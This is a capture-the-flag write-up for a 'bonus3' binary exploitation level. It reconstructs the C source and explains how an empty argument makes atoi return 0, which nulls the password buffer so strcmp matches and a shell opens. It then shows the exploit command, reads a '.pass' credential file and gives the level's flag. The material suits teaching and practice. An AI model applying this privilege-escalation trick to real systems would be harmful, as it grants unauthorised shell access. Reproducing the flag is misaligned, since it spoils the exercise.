# bonus3 — logic trick: the empty-argument null byte

**Teaches:** how `atoi("")` and `strcmp` on a null-terminated buffer interact.
No overflow, no shellcode — pure logic. The last user is `end`.

## 1–2. Reconstructed C
```c
int main(int ac, char **av) {
    int  ret;
    char buffer[132];
    FILE *f = fopen("/home/user/end/.pass", "r");
    memset(buffer, 0, 132);
    if (!f || ac != 2) return -1;
    fread(buffer, 1, 66, f);          // buffer = first 66 bytes of the pass
    buffer[65] = 0;
    buffer[atoi(av[1])] = 0;          // write a '\0' at index atoi(av[1])
    fread(&buffer[66], 1, 65, f);
    fclose(f);
    if (strcmp(buffer, av[1]) == 0)   // buffer must equal our own argument
        execl("/bin/sh", "sh", NULL);
    else
        puts(&buffer[66]);
    return 0;
}
```

## 3. The vulnerability
The program compares the secret `buffer` (loaded from the pass) against **our own
argument** `av[1]`, and it lets us place a `\0` at index `atoi(av[1])`. We don't
know the pass — but we can make **both strings empty**:
- `av[1] = ""` → `atoi("") == 0` → `buffer[0] = 0`, so `buffer` is now the empty string.
- `av[1]` is also the empty string.
- `strcmp("", "") == 0` → the check passes.

## 4. Exploit
```
./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
```
**Why it works:** an empty argument makes `atoi` return 0, which nulls the first
byte of `buffer` (making it ""), and `strcmp` of two empty strings is equal —
triggering `execl("/bin/sh")` as `end`.

Flag → `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`

Then `cat /home/user/end/end` → `Congratulations graduate!` 🎓
